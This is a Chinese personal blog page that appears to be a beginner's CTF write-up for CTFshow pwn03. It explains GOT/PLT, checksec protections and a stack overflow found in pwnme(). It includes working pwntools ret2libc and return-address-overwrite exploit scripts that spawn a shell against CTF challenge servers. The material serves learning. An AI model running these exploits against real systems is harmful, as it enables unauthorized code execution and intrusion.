@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CTFshow pwn03因为是第一次尝试pwn,见谅..下载得到一个stack1文件已知(萌新)：做pwn一般是根据所给的程序，于IDA进行反汇编，经过一系列逆天操作获得&#x2F;bin&#x2F;bash的地址，然后进行EXP的书写，最后pwn!!!,成功执行命令，拿到flag当然这道题先跟着WP进行学系~ got与plt表关系（ret2libc）简单检索一下（我看懵了这就是pwn吗）：PL">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn的小试牛刀">
+<meta property="og:url" content="https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/index.html">
+<meta property="og:site_name" content="Sh_eePpppのHEXO">
+<meta property="og:description" content="CTFshow pwn03因为是第一次尝试pwn,见谅..下载得到一个stack1文件已知(萌新)：做pwn一般是根据所给的程序，于IDA进行反汇编，经过一系列逆天操作获得&#x2F;bin&#x2F;bash的地址，然后进行EXP的书写，最后pwn!!!,成功执行命令，拿到flag当然这道题先跟着WP进行学系~ got与plt表关系（ret2libc）简单检索一下（我看懵了这就是pwn吗）：PL">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/1.png">
+<meta property="article:published_time" content="2025-04-08T15:20:08.000Z">
+<meta property="article:modified_time" content="2025-09-09T07:41:20.554Z">
+<meta property="article:author" content="Sh_eePppp">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="栈溢出">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>pwn的小试牛刀</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Sh_eePpppのHEXO" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-okaidia.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">h0me</a></li><!--
+     --><!--
+       --><li><a href="/categories">Categ0r1es</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Artic1es</a></li><!--
+     --><!--
+       --><li><a href="/links/">L1nks</a></li><!--
+     --><!--
+       --><li><a href="/search/">Searh</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/xuanyuanCTF/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/XYCTF-WP/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&text=pwn的小试牛刀"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&title=pwn的小试牛刀"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&is_video=false&description=pwn的小试牛刀"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwn的小试牛刀&body=Check out this article: https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&title=pwn的小试牛刀"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&title=pwn的小试牛刀"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&title=pwn的小试牛刀"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&title=pwn的小试牛刀"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&name=pwn的小试牛刀&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&t=pwn的小试牛刀"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFshow-pwn03"><span class="toc-number">1.</span> <span class="toc-text">CTFshow pwn03</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#got%E4%B8%8Eplt%E8%A1%A8%E5%85%B3%E7%B3%BB%EF%BC%88ret2libc%EF%BC%89"><span class="toc-number">1.0.1.</span> <span class="toc-text">got与plt表关系（ret2libc）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.0.2.</span> <span class="toc-text">延迟绑定实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#checksec%E5%90%84%E4%B8%AA%E5%80%BC%E7%9A%84%E6%84%8F%E4%B9%89"><span class="toc-number">1.0.3.</span> <span class="toc-text">checksec各个值的意义</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%8D%E7%BD%AE%E6%97%A0%E5%85%B3%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%EF%BC%88PIE%EF%BC%89"><span class="toc-number">1.0.3.0.1.</span> <span class="toc-text">位置无关可执行文件（PIE）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#NX%EF%BC%88%E5%A0%86%E6%A0%88%E7%A6%81%E6%AD%A2%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-number">1.0.3.0.2.</span> <span class="toc-text">NX（堆栈禁止执行）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#RELRO%EF%BC%88GOT-%E5%86%99%E4%BF%9D%E6%8A%A4%EF%BC%89"><span class="toc-number">1.0.3.0.3.</span> <span class="toc-text">RELRO（GOT 写保护）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">开始：</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        pwn的小试牛刀
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Sh_eePppp</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-04-08T15:20:08.000Z" class="dt-published" itemprop="datePublished">2025-04-08</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%AD%A6%E4%B9%A0ing/">学习ing</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/pwn/" rel="tag">pwn</a>, <a class="p-category" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" rel="tag">栈溢出</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="CTFshow-pwn03"><a href="#CTFshow-pwn03" class="headerlink" title="CTFshow pwn03"></a>CTFshow pwn03</h2><p><em><strong>因为是第一次尝试pwn,见谅..</strong></em><br>下载得到一个stack1文件<br>已知(萌新)：做pwn一般是根据所给的程序，于IDA进行反汇编，经过一系列逆天操作获得&#x2F;bin&#x2F;bash的地址，然后进行EXP的书写，最后pwn!!!,成功执行命令，拿到flag<br>当然这道题先跟着WP进行学系~</p>
+<h4 id="got与plt表关系（ret2libc）"><a href="#got与plt表关系（ret2libc）" class="headerlink" title="got与plt表关系（ret2libc）"></a>got与plt表关系（ret2libc）</h4><p>简单检索一下（我看懵了这就是pwn吗）：<br>PLT与GOT表均为动态链接过程中的重要部分</p>
+<pre><code>GOT: Global Offset Table, 全局偏移表，包含所有需要动态链接的外部函数的地址（在第一次执行后）
+PLT: Procedure Link Table, 过程链接表，包含调用外部函数的跳转指令（跳转到GOT表中），以及初始化外部调用指令（用于链接器动态绑定dl_runtime_resolve）
+</code></pre>
+<p>Linux虚拟内存分段映射中，一般会分出三个相关的段：</p>
+<pre><code>.plt: 即上文提到的过程链接表，包含全部的外部函数跳转指令信息
+.got.plt: 即下文将要表达的GOT表，与PLT表搭配使用，包含全部外部函数地址
+</code></pre>
+<p><em><strong>简单来说，PLT表存放跳转相关指令，GOT表存放外部函数（符号）地址</strong></em>点到为止，继续就听不懂了</p>
+<h4 id="延迟绑定实现"><a href="#延迟绑定实现" class="headerlink" title="延迟绑定实现"></a>延迟绑定实现</h4><p>一大堆的东西，看不懂就删了吧<br><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_16356440/8601071">https://blog.51cto.com/u_16356440/8601071</a><br>这位大佬写的过程很详解了，直观看到动态链接前后的变化，以下内容也来自于这篇博客~<br>收获：<br>首先libc中的地址默认开启随机，但是这种随机只是加载到程序时基地址随机，libc内部所有函数的相对位置没有变化。<br>做题时分两种情况<br>1.我们已经获得了题目给的libc文件<br>2.没有libc文件<br>这两种其实再exp写起来思路是差不多的，都需要泄露一个libc库里函数的地址才能用得了库里面别的我们需要的函数，如system。<br>所以无论如何我们得先泄露一个函数的真实地址。在根据具体libc库的版本得知所有函数的偏移情况如何，就可以调用我们心心念念的system函数了。<br>1.这里最好的方法就是泄露已经调用过的函数的地址。因为其地址已经被写入got表了。这里我选择泄露read。</p>
+<p>2.如何让程序把got表里的东西写出来呢，我们这里直接调用像puts，write，printf这样的函数就行。看这段payload，题目里其实还有write函数，但是puts函数只需要一个参数，比较方便，不需要找一大堆popret。</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">io = process(&quot;./repeater&quot;)#在本地调试时引入题目附件</span><br><span class="line">elf = ELF(&#x27;./repeater&#x27;)</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]#其实就是在题目附件里找到call puts@plt的地址</span><br><span class="line">read_got = elf.got[&#x27;read&#x27;]#这是在题目附件里找到got表里read的位置。</span><br><span class="line">#在程序运行了该函数之后，got表里就有read函数真实地址了</span><br><span class="line">vul_adr = 0x401196#由于每次加载程序libc基地址都会变化，</span><br><span class="line">#所以我们整个爆破过程必须一气呵成，在泄露之后回到vuln再次发起爆破</span><br><span class="line">pop_rdi_ret = 0x4012c3#这个地址和vuln地址倒不是随机的，可以直接在IDA看</span><br><span class="line">offset = 0x28#栈溢出填充的垃圾数据的字节数</span><br><span class="line">payload = b&#x27;a&#x27;*offset+p64(pop_rdi_ret)#用pop将后面需要泄露的got表存入rdi，作为puts函数的参数</span><br><span class="line">payload += p64(read_got) + p64(puts_plt)#puts_plt等于puts函数的地址，调用puts把read_got储存的read真实地址泄露</span><br><span class="line">payload += p64(vul_adr)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure></div>
+<p><em><strong>将函数的地址绑定推迟到第一次调用该函数</strong></em></p>
+<h4 id="checksec各个值的意义"><a href="#checksec各个值的意义" class="headerlink" title="checksec各个值的意义"></a>checksec各个值的意义</h4><h6 id="位置无关可执行文件（PIE）"><a href="#位置无关可执行文件（PIE）" class="headerlink" title="位置无关可执行文件（PIE）"></a>位置无关可执行文件（PIE）</h6><p>位置无关可执行文件(Position-Independent Executable)（PIE），顾名思义，它指的是放置在内存中某处执行的代码，不管其绝对地址的位置，即代码段、数据段地址随机化</p>
+<h6 id="NX（堆栈禁止执行）"><a href="#NX（堆栈禁止执行）" class="headerlink" title="NX（堆栈禁止执行）"></a>NX（堆栈禁止执行）</h6><p>NX 代表 不可执行(non-executable)。它通常在 CPU 层面上启用，因此启用 NX 的操作系统可以将某些内存区域标记为不可执行。通常，缓冲区溢出漏洞将恶意代码放在堆栈上，然后尝试执行它。但是，让堆栈这些可写区域变得不可执行，可以防止这种攻击。</p>
+<h6 id="RELRO（GOT-写保护）"><a href="#RELRO（GOT-写保护）" class="headerlink" title="RELRO（GOT 写保护）"></a>RELRO（GOT 写保护）</h6><p>RELRO 代表 “重定位只读(Relocation Read-Only)”。可执行链接格式（ELF）二进制文件使用全局偏移表（GOT）来动态地解析函数。启用 RELRO 后，会设置二进制文件中的 GOT 表为只读，从而防止重定位攻击</p>
+<h3 id="开始："><a href="#开始：" class="headerlink" title="开始："></a>开始：</h3><p>使用IDA反汇编打开stack1，看到main函数</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  puts(&quot;stack happy!&quot;);</span><br><span class="line">  puts(&quot;32bits\n&quot;);</span><br><span class="line">  pwnme();</span><br><span class="line">  puts(&quot;\nExiting&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>有一个pwnme()</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">int pwnme()</span><br><span class="line">&#123;</span><br><span class="line">  char s[9]; // [esp+Fh] [ebp-9h] BYREF</span><br><span class="line"></span><br><span class="line">  fgets(s, 100, stdin);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>**fgets:C 库函数 char *fgets(char <em>str, int n, FILE <em>stream) 从指定的流 stream 读取一行，并把它存储在 str 所指向的字符串内。当读取 (n-1) 个字符时，或者读取到换行符时，或者到达文件末尾时，它会停止，具体视情况而定。</em></em><br>发现只有9个字节大小，但是fgets了100个字节内容，存在栈溢出漏洞<br>栈溢出题目，基本上不需要调试，ida本身提供的栈空间数据就可以实现偏移的计算。<br><em><strong>覆盖返回地址然后执行&#x2F;bin&#x2F;sh</strong></em><br>第一，找到覆盖返回地址的偏移量，即pwnme这个函数的返回地址<br><em><strong>返回地址：当前fgets函数结束后，程序下一步要到达的地方</strong></em><br>第二，找到&#x2F;bin&#x2F;bash在哪里，例如，如果题目有一个函数shell里面有system(“&#x2F;bin&#x2F;bash”),即找到这个shell函数的调用地址<br>附上一个简单的payload</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r = remote(&quot;220.249.52.133&quot;,53948)</span><br><span class="line">payload = &#x27;A&#x27; * 0x80 + &#x27;a&#x27; * 0x8 + p64(0x00400596)//前面两个是偏移量=buf长度0x80+r和buf之间的s的长度0x8 ；后面一个是调用地址</span><br><span class="line">r.recvuntil(&quot;Hello, World\n&quot;) </span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+<p>payload &#x3D; 填充字符 + system地址（ret中eip的位置）</p>
+<p>尝试gdb stack1再run不行，存在nc(checksec最初发现了nc开启)<br>手动添加chmod +x stack1<br>理一下思路，现在我们发现了栈溢出，代码中没有system也没有&#x2F;bin&#x2F;sh，都要在动态库里找，而且要找到返回地址的偏移量<br>32位的程序，通常情况加4个字节覆盖到返回地址<br>或者</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 生成长度为100的乱序字符串</span><br><span class="line">cyclic 100</span><br><span class="line"># R 命令运行输入字符串</span><br><span class="line">发生报错，即溢出成功，查找EIP字符。—— ‘iaaa’</span><br><span class="line">查看EIP字符串 ‘iaaa’ 的偏移量：</span><br><span class="line">cyclic -l iaaa</span><br><span class="line">即可计算出偏移量</span><br></pre></td></tr></table></figure></div>
+<p>运行cyclic 生成随机字符串；获取溢出地址，通过 -l 计算偏移<br>工具pade也可以很方便的计算出偏移量<br>但是问题是关于另一个通过动态链接获取到&#x2F;bin&#x2F;bash还是没太看懂…</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">#io=process(&#x27;./stack1&#x27;)</span><br><span class="line">io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28151)</span><br><span class="line">elf=ELF(&#x27;./stack1&#x27;)</span><br><span class="line">puts_got=elf.got[&#x27;puts&#x27;]#存在puts函数，直接获取它泄露的地址</span><br><span class="line">puts_plt=elf.plt[&#x27;puts&#x27;]#远程libc库的puts地址？</span><br><span class="line">main_addr=elf.symbols[&#x27;main&#x27;]</span><br><span class="line">payload=b&#x27;a&#x27;*13+p32(puts_plt)+p32(main_addr)+p32(puts_got)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(&#x27;32bits\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">puts_addr=u32(io.recv(4))#获取的地址以定位</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)#获取libc版本</span><br><span class="line">libcbase=puts_addr-libc.dump(&#x27;puts&#x27;)#计算基址</span><br><span class="line">sys_addr=libcbase+libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">payload=b&#x27;a&#x27;*13+p32(sys_addr)+b&#x27;a&#x27;*4+p32(bin_sh)#p32加4个字节覆盖到返回地址</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+<p>成功~<br><img src="/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/1.png"></p>
+<p>纪念一下自己做出的最简单的exp</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p = process(&#x27;./cat&#x27;)</span><br><span class="line">p = remote(&quot;challenge.qsnctf.com&quot;,31474)</span><br><span class="line">payload = b&#x27;a&#x27; * (0x50+8) + p64(0x00401232)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+<p>哈哈<br><a target="_blank" rel="noopener" href="https://www.toutiao.com/i6978232161929331214/">https://www.toutiao.com/i6978232161929331214/</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Zheng__Huang/article/details/119484353">https://blog.csdn.net/Zheng__Huang/article/details/119484353</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFshow-pwn03"><span class="toc-number">1.</span> <span class="toc-text">CTFshow pwn03</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#got%E4%B8%8Eplt%E8%A1%A8%E5%85%B3%E7%B3%BB%EF%BC%88ret2libc%EF%BC%89"><span class="toc-number">1.0.1.</span> <span class="toc-text">got与plt表关系（ret2libc）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E5%AE%9E%E7%8E%B0"><span class="toc-number">1.0.2.</span> <span class="toc-text">延迟绑定实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#checksec%E5%90%84%E4%B8%AA%E5%80%BC%E7%9A%84%E6%84%8F%E4%B9%89"><span class="toc-number">1.0.3.</span> <span class="toc-text">checksec各个值的意义</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BD%8D%E7%BD%AE%E6%97%A0%E5%85%B3%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%EF%BC%88PIE%EF%BC%89"><span class="toc-number">1.0.3.0.1.</span> <span class="toc-text">位置无关可执行文件（PIE）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#NX%EF%BC%88%E5%A0%86%E6%A0%88%E7%A6%81%E6%AD%A2%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-number">1.0.3.0.2.</span> <span class="toc-text">NX（堆栈禁止执行）</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#RELRO%EF%BC%88GOT-%E5%86%99%E4%BF%9D%E6%8A%A4%EF%BC%89"><span class="toc-number">1.0.3.0.3.</span> <span class="toc-text">RELRO（GOT 写保护）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">开始：</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&text=pwn的小试牛刀"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&title=pwn的小试牛刀"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/&is_video=false&description=pwn的小试牛刀"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwn的小试牛刀&body=Check out this article: https://hexo.sheep-sys-sudo.top/pwn%E7%9A%84%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
